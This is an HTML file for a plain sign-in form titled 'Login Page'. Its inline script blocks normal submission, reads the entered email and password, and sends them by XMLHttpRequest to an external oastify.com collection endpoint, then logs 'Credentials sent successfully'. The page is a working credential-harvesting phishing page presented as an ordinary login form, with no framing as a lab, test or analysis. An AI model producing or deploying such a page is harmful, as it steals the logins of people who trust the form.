<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <script>
        function handleSubmit(event) {
            event.preventDefault(); // Prevent the default form submission
            
            // Get the form data
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            // Create a request object
            const xhr = new XMLHttpRequest();
            xhr.open('POST', 'https://sfb6g9k6t54i7scgb5o94ag1qswjkh86.oastify.com/endpoint', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');

            // Prepare the data
            const data = `email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`;

            // Send the request
            xhr.send(data);

            // Optionally handle the response here
            xhr.onload = function () {
                if (xhr.status === 200) {
                    console.log('Credentials sent successfully');
                } else {
                    console.error('Error sending credentials');
                }
            };
        }
    </script>
</head>
<body>
    <h1>Login Page</h1>
    <form id="loginForm" onsubmit="handleSubmit(event)">
        <label for="email">Email/Username:</label>
        <input type="text" id="email" name="email" required><br>
        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required><br>
        <button type="submit">Sign In</button>
    </form>
</body>
</html>
